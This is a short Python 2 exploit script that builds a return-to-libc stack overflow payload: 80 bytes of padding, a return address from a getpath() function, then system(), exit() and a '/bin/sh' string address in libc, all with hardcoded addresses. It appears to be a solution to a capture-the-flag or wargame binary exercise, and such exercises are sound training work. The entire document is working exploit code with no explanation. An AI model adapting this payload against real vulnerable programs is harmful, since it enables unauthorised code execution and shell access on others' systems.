#!/usr/bin/python
import struct
padding = "A" * 80

ret = struct.pack("I", 0x08048544) # ret address from getpath()
system = struct.pack("I", 0xb7ecffb0) # system() from libc
exit = struct.pack("I", 0xb7ec60c0) # exit() from libc
shell = struct.pack("I", 0xb7e97000 + 0x11f3bf)

print padding + ret + system + exit + shell
